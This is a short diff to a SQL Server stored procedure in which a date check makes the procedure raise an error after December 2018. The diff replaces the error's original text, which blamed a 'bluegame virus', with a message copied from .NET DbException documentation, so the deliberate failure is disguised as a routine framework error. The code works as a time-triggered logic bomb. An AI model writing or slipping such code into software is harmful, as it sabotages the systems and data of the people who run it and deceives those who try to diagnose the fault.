@@ -16,7 +16,7 @@ AS
 BEGIN
     if GETDATE()> convert(datetime,'2018-12-04')
 	begin
-	  RAISERROR ('Some of the files corrupted due to bluegame virus.', 
+	  RAISERROR ('DbException class with the specified serialization information and context. DbException (SerializationInfo, StreamingContext)', 
                16,
                1
                );  
